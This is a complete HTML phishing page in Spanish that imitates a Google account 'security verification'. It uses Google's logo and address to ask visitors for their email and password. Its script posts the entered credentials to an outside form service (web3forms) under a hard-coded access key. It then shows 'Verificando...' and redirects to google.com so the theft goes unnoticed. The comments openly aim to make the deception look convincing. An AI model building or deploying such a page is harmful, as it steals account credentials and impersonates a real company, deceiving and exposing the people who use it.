<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Cuenta</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .logo {
            width: 75px;
            margin-bottom: 20px;
        }
        h2 {
            color: #202124;
            margin-bottom: 10px;
        }
        p {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }
        input:focus {
            border-color: #1a73e8;
            outline: none;
        }
        button {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
        }
        button:hover {
            background-color: #1765cc;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }
        .error {
            color: #d93025;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Logo de Google genérico -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo">
        
        <h2>Verificación de seguridad</h2>
        <p>Para continuar, por favor confirma tu identidad.</p>
        
        <form action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="ddd3f715-0709-403e-8076-087352cbfef2">
            <input type="hidden" name="redirect" value="https://santino-c.github.io/verificacion-gmail/?status=success">
            
            <input type="email" name="email" placeholder="Correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            
            <button type="submit">Siguiente</button>
            
            <p class="error" id="errorMsg">Por favor, completa todos los campos.</p>
        </form>
        
        <div class="footer">
            Google, Inc. • 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA
        </div>
    </div>

    <script>
        // Script para manejar el envío y redirección si quieres que se vea profesional
        const form = document.querySelector('form');
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(form);
            const object = Object.fromEntries(formData);
            const json = JSON.stringify(object);
            
            const response = await fetch("https://api.web3forms.com/submit", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: json
            }).then((response) => response.json());

            if (response.success) {
                // Simular carga y redirigir para que parezca que está verificando
                document.querySelector('button').innerText = "Verificando...";
                document.querySelector('button').disabled = true;
                
                setTimeout(() => {
                    window.location.href = "https://www.google.com"; // O una página de 'Éxito' propia
                }, 2000);
            } else {
                document.getElementById('errorMsg').style.display = 'block';
            }
        });
    </script>
</body>
</html>
